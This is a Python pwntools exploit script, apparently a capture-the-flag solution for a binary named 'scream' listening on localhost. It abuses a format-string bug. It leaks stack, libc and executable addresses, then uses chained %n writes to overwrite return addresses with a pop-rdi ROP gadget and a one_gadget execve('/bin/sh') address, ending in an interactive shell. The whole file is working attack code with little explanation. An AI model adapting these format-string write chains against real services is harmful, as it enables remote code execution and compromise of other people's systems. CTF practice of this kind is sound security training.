#!/usr/bin/env python3

from pwn import *
from printf import PrintfPayload

exe = ELF("./scream")
libc = ELF("./libc.so.6")

context.binary = exe

GDBSCRIPT = '''
# bp main+8
bp fun+93
bp fun+154
bp fun+215
# bp fun+242
# bp fun+248
bp fun+268
# bp main+106
'''

def conn():
    if args.GDB:
        r = exe.debug(gdbscript=GDBSCRIPT)
    elif args.LOCAL:
        r = exe.process()
    else:
        r = remote("127.0.0.1", 24017)
    return r

# Pointers to stack at:
# rsp+0x10: rbp of main
# rsp+0x20: rsp+0x158 (10$)
# rsp+0x50: rsp+0x140 (16$)
# rsp+0x88: rsp+0x168 (23$) (=R13 Requires valid envp)
PTR2PTR_OFFSETS = [
    0x20,
    0x50,
    # 0x88,
]

PTR_OFFSETS = [
    0x158,
    0x140,
    # 0x168,
]

# Return address:
# rsp+0x18: main+80 (9$)
# rsp+0x48: __libc_start_call_main+122 (15$)
LOCAL_RET_OFFSET = 0x18
LOCAL_RBP = 0x10
NEW_RET_OFFSET = 0x20
MAIN_RET_OFFSET = 0x48
MAIN_RBP_OFFSET = 0x40
LIBC_RET_OFFSET = 0x27c8a
ROP_GADGET = ROP(libc).rdi # libc@0x28215
debug(f'Found gadget: {ROP_GADGET.insns} @ {ROP_GADGET.address}')

'''
0xd636b execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
'''
GADGET_OFFSET = 0xd636b

def prep_ptr(ptr2ptr_offset: int, write_addr: int):
    payload_patch_ptrs = PrintfPayload()
    payload_patch_ptrs.write(ptr2ptr_offset, write_addr&0xFFFF)
    return payload_patch_ptrs.flat(use_num_params=False, reset_write_count=True)

def prep_ptrs(write_addr: int):
    '''Prepares the pointers to write to the address we want'''
    payload_patch_ptrs = PrintfPayload()
    for i, offset in enumerate(PTR2PTR_OFFSETS):
        payload_patch_ptrs.write(offset, (write_addr+i*2)&0xFFFF)
    return payload_patch_ptrs.flat(use_num_params=False, reset_write_count=True)

def main():
    global PTR2PTR_OFFSETS
    global PTR_OFFSETS
    r = conn()
    # I think it's a buffering isssue, sendlineafter(b'> ') don't work
    # Still don't work after setting no buffer, might be setup problem
    r.sendline(b'%10$p %15$p %9$p') # rsp+0x158 __libc_start_call_main+122 main+80
    line = r.recvline_startswith(b'> ')
    line = line.lstrip(b'> ') # keepends only strip trailing newlines
    ptrs = [int(p[2:], base=16) for p in line.split(b' ')]
    rsp = ptrs[0] - 0x158
    info(f'Got rsp={hex(rsp)}')
    assert(rsp&0xF == 0)
    libc.address = ptrs[1] - LIBC_RET_OFFSET
    info(f'Got libc={hex(libc.address)}')
    assert(libc.address & 0xFFF == 0)
    exe.address = ptrs[2] - (exe.sym['main'] + 80)
    info(f'Got exe={hex(exe.address)}')
    assert(exe.address & 0xFFF == 0)
    # 1. Change return address of fun to fun, and point 2nd pointer to rsp+0x28
    payload_patch_ptrs = PrintfPayload()
    write_addrs = [rsp+LOCAL_RET_OFFSET, rsp+0x28]
    for offset, write_addr in zip(PTR2PTR_OFFSETS, write_addrs):
        debug(f'Offset: {hex(offset)}, write_addr: {hex(write_addr)}')
        payload_patch_ptrs.write(offset, write_addr&0xFFFF)
    prep_ptr_payload = payload_patch_ptrs.flat(use_num_params=False, reset_write_count=True)
    payload_set_ret_addr = PrintfPayload()
    payload_set_ret_addr.write(PTR_OFFSETS[0], exe.symbols['fun'] & 0xFFFF)
    buf = prep_ptr_payload + payload_set_ret_addr.flat()
    debug(f'Payload: {buf}')
    r.sendlineafter(
        b'Louder!',
        buf,
    )
    # 2. Set rsp+0x28 to null
    buf = f'%{PTR_OFFSETS[1]//8+6}$lln'.encode()
    r.sendlineafter(b'> ', buf)
    # 3. Change new ret address to pop rdi, ret gadget, write low 4 bytes
    rsp += 8
    # Stack moves down by 8 bytes
    PTR2PTR_OFFSETS = [0x60, 0x50-8] # 0x20 is return address, use 0x60 instead, also refers to 0x150
    PTR_OFFSETS = [offset-8 for offset in PTR_OFFSETS]
    payload_write_pop_1 = PrintfPayload()
    target_val = libc.address + ROP_GADGET.address
    for i, offset in enumerate(PTR_OFFSETS):
        payload_write_pop_1.write(offset, (target_val >> (i*16))&0xFFFF)
    buf = prep_ptrs(rsp+0x18)+payload_write_pop_1.flat()
    debug(f'Write {hex(rsp+0x18)} -> {hex(target_val)}')
    debug(f'Payload: {buf}')
    r.sendlineafter(b'> ', buf)
    # 4. Change new ret address to pop rdi, ret gadget, write [4,5] bytes and write low 2 bytes of rsp+0x28
    payload_patch_ptrs = PrintfPayload()
    write_addrs = [rsp+0x18+4, rsp+0x28]
    for offset, addr in zip(PTR2PTR_OFFSETS, write_addrs):
        payload_patch_ptrs.write(offset, addr&0xFFFF)
    payload_write_pop_2 = PrintfPayload()
    target_vals = [(libc.address+ROP_GADGET.address>>32)&0xFFFF, (libc.address+GADGET_OFFSET)&0xFFFF]
    for offset, val in zip(PTR_OFFSETS, target_vals):
        payload_write_pop_2.write(offset, val)
    buf = payload_patch_ptrs.flat(use_num_params=False, reset_write_count=True)+payload_write_pop_2.flat()
    debug(f'Write [{[hex(addr) for addr in write_addrs]}] = [{[hex(val) for val in target_vals]}]')
    debug(f'Payload: {buf}')
    r.sendlineafter(b'> ', buf)
    # 5. Write one_gadget to rsp+0x28
    payload_write_pop_3 = PrintfPayload()
    target_val = (libc.address + GADGET_OFFSET) >> 16
    for i, offset in enumerate(PTR_OFFSETS):
        payload_write_pop_3.write(offset, (target_val >> (i*16))&0xFFFF)
    r.sendlineafter(b'> ', prep_ptrs(rsp+0x28+2)+payload_write_pop_3.flat())
    r.recvline_contains(b'Thanks for stopping by! Remember, your scream is always processed, so don\'t jump.')
    r.interactive()


if __name__ == "__main__":
    main()
